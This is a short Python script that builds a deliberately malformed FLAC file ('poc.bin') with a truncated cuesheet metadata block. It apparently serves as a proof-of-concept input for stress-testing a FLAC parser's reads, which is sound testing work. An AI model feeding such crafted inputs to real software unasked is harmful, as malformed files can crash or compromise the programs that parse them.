from pathlib import Path
# Attempt a cuesheet-driven short file that may stress byte-aligned reads
p=Path('/workspace/poc.bin')
payload = bytearray(b'fLaC')
payload += bytes([0x00,0x00,0x00,0x22]) + b'\x00'*34
# cuesheet block header: last=1, type=5, length intentionally short
payload += bytes([0x85,0x00,0x00,0x18])
# cuesheet fields truncated on track header boundaries
payload += b'\x00'*24
p.write_bytes(payload)
print(len(payload))
